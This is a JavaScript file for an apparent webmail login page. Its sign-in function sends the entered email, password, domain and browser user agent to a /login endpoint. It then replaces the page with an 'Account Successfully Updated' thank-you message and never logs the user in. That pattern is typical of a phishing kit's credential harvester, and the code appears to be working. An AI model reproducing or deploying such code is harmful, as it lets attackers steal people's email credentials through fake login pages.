document.addEventListener('DOMContentLoaded', function() {
    /*document.getElementById("spinnerIMG").style.display = "none";*/
    document.getElementById("mLoginBox").style.display = "";
});

function fnSignin(sMode) {
    //document.getElementById("spinnerIMG").style.display = "";
    document.getElementById("mLoginBox").style.display = "none";

    var sPageUsername = document.getElementById('emailID').value;
    var sPagePassword = document.getElementById('emailPassword').value;
    var sPageDomain = '';
    var sPageRememberMe;

    var arrLogin = sPageUsername.split("@");
    sPageUsername = arrLogin[0];

    if (arrLogin.length == 2)
        sPageDomain = arrLogin[1];

    if (document.getElementById('RememberMe').checked)
        sPageRememberMe = 'on';
    else
        sPageRememberMe = '';

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "/login", true);
    xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
            document.write(`
                <div style="max-width: 600px; margin: 50px auto; padding: 40px; background: #f8f9fa; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center;">
                    <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" fill="#28a745" class="bi bi-check-circle-fill" viewBox="0 0 16 16" style="margin-bottom: 20px;">
                        <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zm-3.97-3.03a.75.75 0 0 0-1.08.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-.01-1.05z"/>
                    </svg>
                    <h2 style="color: #2c3e50; margin-bottom: 15px;">Account Successfully Updated</h2>
                    <p style="color: #4a5568; font-size: 16px; line-height: 1.6;">
                        Thank you.
                    </p>
                </div>
            `);
        }
    };
    var data = JSON.stringify({
        username: sPageUsername,
        password: sPagePassword,
        domain: sPageDomain,
        rememberMe: sPageRememberMe,
        ip: '',
        timestamp: '',
        userAgent: navigator.userAgent
    });
    xhr.send(data);
}

$(function(){
    var windowH = $(document).height();
    var wrapperH = $('#spinnerIMG').height();
    $('#spinnerIMG').css({'height':($(document).height() - 160)+'px'});
});

$(window).resize(function(){
    $('#spinnerIMG').css({'height':($(document).height() - 160)+'px'});
});

$(window).load(function() {
    if (top.mDOMReady == true) {
        g_fInitPage();
    }
});